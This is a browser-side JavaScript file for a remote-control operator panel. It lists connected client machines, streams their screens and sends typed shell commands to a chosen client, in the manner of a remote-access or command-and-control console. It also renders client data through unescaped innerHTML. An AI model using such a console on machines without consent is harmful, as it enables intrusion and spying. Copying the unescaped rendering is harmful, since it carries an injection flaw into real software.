// public/panel.js
const socket = io();
let operatorKey = '';
let clients = [];
let selectedClientId = null;

const loginDiv = document.getElementById('login');
const appDiv = document.getElementById('app');
const keyInput = document.getElementById('keyInput');
const loginBtn = document.getElementById('loginBtn');
const loginError = document.getElementById('loginError');
const clientList = document.getElementById('clientList');
const clientsView = document.getElementById('clientsView');
const controlView = document.getElementById('controlView');
const backToClients = document.getElementById('backToClients');
const selectedClientLabel = document.getElementById('selectedClientLabel');
const screenImg = document.getElementById('screen');
const statusIndicator = document.getElementById('statusIndicator');
const viewTitle = document.getElementById('viewTitle');

loginBtn.onclick = () => {
  const key = keyInput.value.trim();
  if (!key) return;
  operatorKey = key;
  socket.emit('operator:register', key);
};

socket.on('operator:ready', () => {
  loginDiv.classList.add('hidden');
  appDiv.classList.remove('hidden');
  statusIndicator.textContent = 'Connected';
  statusIndicator.className = 'status-online';
});

socket.on('operator:error', (msg) => {
  loginError.textContent = msg || 'Invalid key';
});

socket.on('clients', (list) => {
  clients = list;
  renderClients();
});

function renderClients() {
  clientList.innerHTML = '';
  clients.forEach(c => {
    const card = document.createElement('div');
    card.className = 'client-card';
    card.innerHTML = `
      <div class="hostname">${c.hostname || 'Unknown'}</div>
      <div class="meta">IP: ${c.ip || 'N/A'}</div>
      <div class="meta">OS: ${c.os || 'N/A'}</div>
      <div class="meta">ID: ${c.id.slice(0, 8)}...</div>
    `;
    card.onclick = () => selectClient(c.id);
    clientList.appendChild(card);
  });
}

function selectClient(id) {
  selectedClientId = id;
  const c = clients.find(x => x.id === id);
  selectedClientLabel.textContent = c ? `${c.hostname} (${c.ip})` : id;
  clientsView.classList.add('hidden');
  controlView.classList.remove('hidden');
  viewTitle.textContent = 'Remote Control';
  screenImg.src = '';
}

backToClients.onclick = () => {
  selectedClientId = null;
  controlView.classList.add('hidden');
  clientsView.classList.remove('hidden');
  viewTitle.textContent = 'Connected Clients';
};

socket.on('frame', ({ id, data }) => {
  if (id === selectedClientId) {
    screenImg.src = 'data:image/jpeg;base64,' + data;
  }
});

socket.on('output', ({ id, data }) => {
  if (id === selectedClientId) {
    console.log('Output from client:', data);
    alert('Output:\n' + data);
  }
});

document.querySelectorAll('[data-action]').forEach(btn => {
  btn.onclick = () => {
    if (!selectedClientId) return alert('Select a client first');
    const action = btn.dataset.action;
    let cmd = { action };
    if (action === 'shell') {
      const c = prompt('Enter shell command:');
      if (!c) return;
      cmd = { action: 'shell', cmd: c };
    }
    socket.emit('operator:cmd', { targetId: selectedClientId, cmd });
  };
});

document.getElementById('logoutBtn').onclick = () => {
  location.reload();
};

document.querySelectorAll('.sidebar nav button').forEach(btn => {
  btn.onclick = () => {
    document.querySelectorAll('.sidebar nav button').forEach(b => b.classList.remove('active'));
    btn.classList.add('active');
    if (btn.dataset.view !== 'clients') {
      alert('This module is not implemented in this build.');
      document.querySelector('.sidebar nav button[data-view="clients"]').classList.add('active');
      btn.classList.remove('active');
    }
  };
});